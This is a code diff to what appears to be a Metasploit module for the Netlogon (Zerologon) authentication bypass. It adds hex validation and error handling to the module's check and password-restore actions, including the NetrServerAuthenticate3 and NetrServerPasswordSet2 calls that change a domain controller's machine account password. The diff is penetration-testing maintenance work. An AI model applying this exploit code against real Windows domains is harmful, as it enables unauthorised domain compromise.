@@ -12,7 +12,6 @@ class MetasploitModule < Msf::Auxiliary
   CheckCode = Exploit::CheckCode
   Netlogon = RubySMB::Dcerpc::Netlogon
   EMPTY_SHARED_SECRET = OpenSSL::Digest::MD4.digest('')
-  SERVER_SECURE_CHANNEL = 6
 
   def initialize(info = {})
     super(
@@ -55,7 +54,7 @@ class MetasploitModule < Msf::Auxiliary
       [
         Opt::RPORT(0),
         OptString.new('NBNAME', [ true, 'The server\'s NetBIOS name', '' ]),
-        OptString.new('PASSWORD', [ false, 'The password to set' ]),
+        OptString.new('PASSWORD', [ false, 'The password to restore for the machine account (in hex)' ], conditions: %w{ ACTION == RESTORE }),
       ]
     )
   end
@@ -86,7 +85,7 @@ class MetasploitModule < Msf::Auxiliary
       netr_server_req_challenge
       response = netr_server_authenticate3
 
-      break if (status = response.status) == 0
+      break if (status = response.error_status) == 0
     end
 
     return CheckCode::Detected unless status == 0
@@ -112,8 +111,8 @@ class MetasploitModule < Msf::Auxiliary
       host: rhost,
       port: @dport,
       name: name,
-      sname: 'netlogon',
-      proto: 'dcerpc',
+      sname: 'dcerpc',
+      proto: 'tcp',
       refs: references,
       info: "Module #{fullname} successfully authenticated to the server without knowledge of the shared secret"
     )
@@ -126,6 +125,10 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def action_restore_password
+    fail_with(Failure::BadConfig, 'The RESTORE action requires the PASSWORD option to be set') if datastore['PASSWORD'].blank?
+    fail_with(Failure::BadConfig, 'The PASSWORD option must be in hex') if /^([0-9a-fA-F]{2})+$/ !~ datastore['PASSWORD']
+    password = [datastore['PASSWORD']].pack('H*')
+
     bind_to_netlogon_service
     client_challenge = OpenSSL::Random.random_bytes(8)
 
@@ -134,9 +137,7 @@ class MetasploitModule < Msf::Auxiliary
     ppp = encrypt_netlogon_credential(client_challenge, session_key)
 
     response = netr_server_authenticate3(client_credential: ppp)
-    fail_with(Failure::NoAccess, 'Failed to authenticate (the machine account password may not be empty)') unless response.status == 0
-
-    password = [datastore['PASSWORD']].pack('H*')
+    fail_with(Failure::NoAccess, 'Failed to authenticate (the machine account password may not be empty)') unless response.error_status == 0
 
     new_password_data = ("\x00" * (512 - password.length)) + password + [password.length].pack('V')
     response = netr_server_password_set2(
@@ -156,7 +157,7 @@ class MetasploitModule < Msf::Auxiliary
     nrpc_call('NetrServerAuthenticate3',
               primary_name: "\\\\#{datastore['NBNAME']}",
               account_name: "#{datastore['NBNAME']}$",
-              secure_channel_type: SERVER_SECURE_CHANNEL,
+              secure_channel_type: :ServerSecureChannel,
               computer_name: datastore['NBNAME'],
               client_credential: client_credential,
               flags: 0x212fffff)
@@ -167,7 +168,7 @@ class MetasploitModule < Msf::Auxiliary
     request = NetrServerPasswordSet2Request.new(
       primary_name: "\\\\#{datastore['NBNAME']}",
       account_name: "#{datastore['NBNAME']}$",
-      secure_channel_type: SERVER_SECURE_CHANNEL,
+      secure_channel_type: :ServerSecureChannel,
       computer_name: datastore['NBNAME'],
       authenticator: authenticator,
       clear_new_password: clear_new_password
@@ -184,7 +185,14 @@ class MetasploitModule < Msf::Auxiliary
 
   def nrpc_call(name, **kwargs)
     request = Netlogon.const_get("#{name}Request").new(**kwargs)
-    Netlogon.const_get("#{name}Response").read(dcerpc.call(request.opnum, request.to_binary_s))
+
+    begin
+      raw_response = dcerpc.call(request.opnum, request.to_binary_s)
+    rescue Rex::Proto::DCERPC::Exceptions::Fault
+      fail_with(Failure::UnexpectedReply, "The #{name} netlogon RPC request failed")
+    end
+
+    Netlogon.const_get("#{name}Response").read(raw_response)
   end
 
   # [3.5.4.4.5 NetrServerPasswordSet2 (Opnum 30)](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nrpc/14b020a8-0bcf-4af5-ab72-cc92bc6b1d81)
@@ -196,9 +204,9 @@ class MetasploitModule < Msf::Auxiliary
 
     endian :little
 
-    ndr_lp_str :primary_name
+    logonsrv_handle :primary_name
     ndr_string :account_name
-    ndr_enum :secure_channel_type
+    netlogon_secure_channel_type :secure_channel_type
     ndr_string :computer_name
     netlogon_authenticator :authenticator
     string :clear_new_password, length: 516
